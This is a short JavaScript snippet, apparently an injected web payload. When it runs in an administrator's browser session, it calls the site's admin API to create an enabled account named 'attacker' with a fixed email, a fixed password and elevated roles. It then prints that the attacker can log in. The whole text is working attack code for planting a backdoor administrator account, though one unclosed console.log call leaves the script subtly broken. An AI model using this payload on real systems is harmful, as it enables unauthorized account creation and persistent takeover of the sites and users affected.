console.log("start ..."
var xhr = new XMLHttpRequest();
xhr.open("POST", "/api/web/admin/user/create", true);
console.log("post data to your api")
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({"firstName":"attacker","lastName":"-","email":"attacker1@atacker.ir","phone":"+989123456789","status":"ENABLED","inputPassword":"a@bemSa123","userProducts":[{"product":null,"enabled":true,"roles":[1,2]}]}));
console.log("success")
console.log("now you can login with attacker1@atacker.ir and password: a@bemSa123")
